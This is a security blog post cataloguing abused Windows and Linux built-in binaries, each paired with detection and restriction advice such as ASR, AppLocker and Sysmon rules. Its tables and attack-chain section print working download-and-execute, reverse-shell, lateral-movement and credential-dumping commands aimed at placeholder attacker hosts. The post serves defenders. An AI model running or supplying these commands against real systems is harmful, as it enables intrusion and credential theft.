Living Off The Land Binaries — Attackers Using Your Own Tools Against You

2026-06-16 · 1 min read · Tools · lolbins red-team blue-team windows evasion detection defense-evasion

LOLBins are signed Microsoft binaries that attackers weaponise to download, execute, and persist — bypassing application whitelisting and AV. A comprehensive reference table of the most abused LOLBins, what they do, and how to detect and restrict each one.

Living Off The Land (LOTL) is one of the most effective evasion techniques available to an attacker — and one of the most painful for defenders to address. The concept is simple: instead of dropping custom malware that defenders can signature, use the tools already present on the target system. Microsoft-signed. Trusted by your AV. Allowed by your application whitelist. Running under a legitimate process.

LOLBins (Living Off the Land Binaries) are a subset of this: Windows binaries already present on most systems that were not designed for malicious use but have been repeatedly abused to download code, execute payloads, bypass controls, or establish persistence.

The canonical reference is LOLBAS Project (lolbas-project.github.io) — this post covers the most operationally significant entries with detection logic for each.

Why LOLBins work so well

Most endpoint controls operate on reputation and signature. Microsoft-signed binaries have the highest possible reputation. Application whitelisting (AppLocker, WDAC) typically allows all signed Windows binaries by default. Behavioural detections must be explicitly tuned to catch legitimate tools being misused — a much harder problem than catching known-malicious files.

01 Windows LOLBins — Execution & Download

BinaryLocationAbuse TechniqueDetection Focus
**certutil.exe**`C:\Windows\System32\`Download files (`-urlcache -f http://...`), decode base64 (`-decode`), encode (`-encode`), calculate file hash — frequently used as first-stage downloaderAlert on: certutil with `-urlcache`, `-decode`, or `-encode` flags. Child processes of certutil are almost always malicious
**mshta.exe**`C:\Windows\System32\`Execute HTA (HTML Application) files from URL: `mshta.exe http://evil.com/payload.hta`. HTA runs JScript/VBScript with full COM access, bypasses most script restrictionsAlert on: mshta.exe with http:// or https:// arguments. mshta spawning cmd.exe, powershell.exe, or wscript.exe
**regsvr32.exe**`C:\Windows\System32\``regsvr32 /s /u /i:http://evil.com/file.sct scrobj.dll` — 'Squiblydoo' loads remote scriptlet, executes arbitrary COM object, bypasses AppLockerAlert on: regsvr32 with `/i:http` argument, or registering DLLs from temp directories
**rundll32.exe**`C:\Windows\System32\`Execute arbitrary DLL exports: `rundll32.exe evil.dll,EntryPoint`. Also abused to load JavaScript via `rundll32 javascript:...` and run MSI filesAlert on: rundll32 loading DLLs from user-writable locations (AppData, Temp, Downloads). rundll32 with javascript: in arguments
**msiexec.exe**`C:\Windows\System32\`Install remote MSI: `msiexec /q /i http://evil.com/payload.msi`. MSI packages can execute arbitrary code; this downloads and runs silentlyAlert on: msiexec with `/i http://` or `/i https://` arguments, or installing from temp paths
**bitsadmin.exe**`C:\Windows\System32\`Background download of arbitrary files: `bitsadmin /transfer job /download /priority high http://evil.com/file.exe C:\Users\evil.exe`. Legacy but still worksAlert on: bitsadmin creating transfer jobs pointing to external URLs and writing to user-writable paths
**wmic.exe**`C:\Windows\System32\wbem\`Process creation: `wmic process call create calc.exe`. Lateral movement via `/node:TARGET`. Spawn processes that inherit parent (wmiprvse.exe) — breaks many detection chainsAlert on: wmic.exe with `process call create` and suspicious commands. wmiprvse.exe spawning shells or network tools
**cmstp.exe**`C:\Windows\System32\`Install connection manager profiles from INF files: loads malicious DLL specified in INF. Also bypasses UAC on some Windows versionsAlert on: cmstp.exe with `/s /ns` flags or referencing INF files from non-standard locations

02 Windows LOLBins — Scripting & Persistence

BinaryLocationAbuse TechniqueDetection Focus
**wscript.exe / cscript.exe**`C:\Windows\System32\`Execute VBScript or JScript: `wscript.exe malware.vbs`. Frequently used in email attachment chains. cscript is the console versionAlert on: wscript/cscript executing scripts from Temp, AppData, Downloads, or directly from email attachment directories
**powershell.exe**`C:\Windows\System32\`Encoded commands (`-enc`), download-cradles (`IEX (iwr ...)`), AMSI bypass, constrained language mode bypass, fileless payload executionEnable ScriptBlock Logging (EID 4104). Alert on: `-enc` flag, `IEX`, `DownloadString`, `-NonInteractive -WindowStyle Hidden` combination
**pwsh.exe**`C:\Program Files\PowerShell\7\`PowerShell 7 (cross-platform). May have fewer event logging hooks than Windows PowerShell — attackers use it to avoid EID 4103/4104 on older configsEnsure ScriptBlock Logging is configured for PowerShell 7 separately from Windows PowerShell. Monitor pwsh.exe process creation same as powershell.exe
**schtasks.exe**`C:\Windows\System32\`Persistence: `schtasks /create /tn 'Update' /tr 'cmd /c evil.exe' /sc ONLOGON`. Lateral movement: `/s TARGET` to schedule tasks remotelyAlert on: schtasks /create pointing to user-writable paths. Windows Event 4698 (task created) especially during off-hours. Remote task creation (4698 on remote host)
**at.exe**`C:\Windows\System32\`Legacy scheduler (deprecated) — still present on many systems. Remote execution: `at \\TARGET 12:00 cmd.exe`Alert on any at.exe usage — it has no legitimate modern use case. Windows Event 4698 covers both at.exe and schtasks.exe
**reg.exe**`C:\Windows\System32\`Registry persistence: `reg add HKCU\...\Run /v Updater /d evil.exe`. Export credential hive: `reg save HKLM\SYSTEM system.hiv`Alert on: reg add to Run/RunOnce keys. `reg save` or `reg export` of SAM, SECURITY, or SYSTEM hives — credential theft indicator
**sc.exe**`C:\Windows\System32\`Install malicious service: `sc create evilsvc binPath= C:\evil.exe start= auto`. Services run as SYSTEM and persist across rebootsAlert on: sc.exe create with binPath pointing to user-writable locations. Windows Event 7045 (new service installed)

03 Windows LOLBins — Credential Access & Recon

BinaryLocationAbuse TechniqueDetection Focus
**ntdsutil.exe**`C:\Windows\System32\`AD database snapshot: `ntdsutil 'ac i ntds' 'ifm' 'create full C:\temp\dump'` — creates an offline copy of NTDS.dit containing all domain password hashesAlert on any ntdsutil.exe usage outside documented backup windows. This is almost never used legitimately on workstations. Windows Event 4688 + command line
**vssadmin.exe**`C:\Windows\System32\`Volume Shadow Copy for credential theft: `vssadmin create shadow` then copy NTDS.dit from shadow. Also used by ransomware: `vssadmin delete shadows /all`Alert on: vssadmin create/delete shadows. Any process accessing NTDS.dit via VSS path. Ransomware typically chains vssadmin delete with encryption immediately after
**net.exe / net1.exe**`C:\Windows\System32\`Reconnaissance: `net user`, `net localgroup administrators`, `net view`, `net share`. Lateral movement: `net use \\TARGET\c$ /user:admin pass`Alert on: net commands executed by non-admin users, net commands run from unusual parent processes (PowerShell, mshta, wscript). High frequency indicates automated recon
**tasklist.exe / taskkill.exe**`C:\Windows\System32\`Process enumeration (recon), kill security tools: `taskkill /f /im mbam.exe`Alert on: taskkill targeting known security products (MBAMService, SentinelAgent, CrowdStrike*, CarbonBlack*)
**procdump.exe** (Sysinternals)Downloaded — not built-inLSASS dump: `procdump -ma lsass.exe lsass.dmp` — signed Microsoft tool, often whitelisted. Dumps process memory containing credentialsAlert on: procdump targeting lsass.exe. Windows Event 10 (Sysmon process access) with lsass.exe as target. Also block with Windows Defender Credential Guard
**whoami.exe / ipconfig.exe / systeminfo.exe**`C:\Windows\System32\`Post-exploitation recon in sequence: attackers run all three within seconds — automated recon checklist artefactAlert on: whoami + systeminfo + ipconfig executed within 60 seconds from the same process lineage. This pattern = almost certain intrusion

04 Linux LOLBins

BinaryAbuse TechniqueDetection Focus
**curl / wget**Download and execute: `curl http://evil.com/payload | bash`. Attacker favourite for initial stager deliveryAlert on: curl/wget output piped to bash/sh. Output to /tmp or /dev/shm. Running with `-s` (silent) flag from unusual parents
**python3 / perl / ruby**Inline reverse shells: `python3 -c 'import os,pty;os.dup2(s.fileno(),0);pty.spawn("/bin/sh")'`. Execute remote code with `-c` or `-e` flagsAlert on: interpreter invoked with `-c` containing socket/exec/pty content. Network connections from python3/perl/ruby processes
**nc / ncat / socat**Reverse shell: `nc -e /bin/sh attacker.com 4444`. Encrypted tunnel: `socat TCP-L:4444 EXEC:bash`Alert on: nc/socat spawning a shell process as child. Network connections from these tools to external IPs especially on high ports
**base64**Decode obfuscated payloads: `echo 'ENCODED' | base64 -d | bash`Alert on: base64 output piped to bash/sh/python. Long base64 strings in command arguments (>200 chars likely encoded payload)
**find / cp / dd**Data exfiltration: copy sensitive files to a staging directory. `find / -name '*.pem' 2>/dev/null` credential huntingAlert on: find recursing from / with -name patterns matching credentials (.pem, .key, id_rsa, .env, password, secret). Run from non-admin shells
**crontab**Persistence: `crontab -e` to add `* * * * * /tmp/beacon`. Or write to `/etc/cron.d/` if rootAlert on: crontab modifications (auditd rule: -w /var/spool/cron -p wa). New files in /etc/cron.d/ or /etc/cron.hourly/
**awk / sed**`awk 'BEGIN {cmd="/bin/sh"; print "" | cmd}'` — execute shell from awk. Used to bypass restricted shellsAlert on: awk/sed spawning shell processes. Restricted shell (rbash) breakout attempts

05 Attack Examples — Common LOLBin Chains

Certutil download chain

cmd 
REM Stage 1: certutil downloads the payload
certutil.exe -urlcache -split -f http://attacker.com/payload.exe C:\Users\Public\payload.exe

REM Stage 2: Execute
C:\Users\Public\payload.exe

REM Variation: base64 decode to bypass content inspection
certutil.exe -urlcache -split -f http://attacker.com/payload.b64 C:\Users\Public\payload.b64
certutil.exe -decode C:\Users\Public\payload.b64 C:\Users\Public\payload.exe

Regsvr32 Squiblydoo

cmd 
REM Load remote COM scriptlet via scrobj.dll — bypasses AppLocker
regsvr32.exe /s /u /i:http://attacker.com/payload.sct scrobj.dll

REM The SCT file is XML containing a JScript/VBScript payload
REM <scriptlet><registration progid='test' classid='{...}'>
REM   <script language='JScript'>
REM     var r = new ActiveXObject('WScript.Shell');
REM     r.Run('cmd.exe /c powershell -enc ...');
REM   </script>
REM </registration></scriptlet>

WMIC lateral movement

cmd 
REM Execute process on remote host via WMIC (requires valid credentials)
wmic /node:10.0.20.11 /user:DOMAIN\admin /password:Password1 \
  process call create "powershell -enc BASE64PAYLOAD"

REM Why this is hard to detect:
REM - Uses legitimate credentials
REM - Process is spawned by wmiprvse.exe on target (looks legitimate)
REM - WMIC traffic is encrypted over DCE/RPC
REM - No file written to target (if payload is in-memory)

06 Detection and Restriction Strategy

The goal is not to block all LOLBins — many have legitimate uses. The goal is to contextualise their execution: who ran it, from what parent process, with what arguments, at what time. Anomaly detection beats signature detection here.

powershell 
# Windows Defender Attack Surface Reduction (ASR) rules — block the most abused patterns
# Requires Defender ATP / MDE

# Block Office apps from creating child processes
Add-MpPreference -AttackSurfaceReductionRules_Ids 'd4f940ab-401b-4efc-aadc-ad5f3c50688a' -AttackSurfaceReductionRules_Actions Enabled

# Block process creations originating from PSExec and WMI commands
Add-MpPreference -AttackSurfaceReductionRules_Ids 'd1e49aac-8f56-4280-b9ba-993a6d77406c' -AttackSurfaceReductionRules_Actions Enabled

# Block JavaScript or VBScript from launching downloaded executable content
Add-MpPreference -AttackSurfaceReductionRules_Ids 'd3e037e1-3eb8-44c8-a917-57927947596d' -AttackSurfaceReductionRules_Actions Enabled

# Block execution of potentially obfuscated scripts
Add-MpPreference -AttackSurfaceReductionRules_Ids '5beb7efe-fd9a-4556-801d-275e5ffc04cc' -AttackSurfaceReductionRules_Actions Enabled

# AppLocker: block execution from user-writable paths (allow-list approach)
# Start with Audit mode — collect events before switching to Enforce
New-AppLockerPolicy -RuleType Path -User Everyone -Path '%TEMP%\*' -Action Deny
yaml 
# Sysmon rule: detect certutil used as downloader
# Add to sysmonconfig.xml EventFiltering section

<RuleGroup name="certutil_abuse" groupRelation="or">
  <ProcessCreate onmatch="include">
    <Rule name="CertUtil Downloader" groupRelation="and">
      <Image condition="end with">certutil.exe</Image>
      <CommandLine condition="contains any">-urlcache;-decode;-encode;-verifyctl</CommandLine>
    </Rule>
  </ProcessCreate>
</RuleGroup>
Quick wins — restrict the highest-impact LOLBins first

If you can only restrict a few, prioritise these because they offer the most attacker value with no legitimate daily-use case in most environments:
1. cmstp.exe — disable via AppLocker if your org does not use Connection Manager profiles
2. mshta.exe — block or monitor; almost never needed for business operations
3. regsvr32.exe with /i:http — ASR rule exists specifically for this
4. certutil.exe with -urlcache — block the flag, not the binary (hashing is a legitimate use)
5. wscript.exe / cscript.exe from email paths — block execution from Outlook attachment temp directories
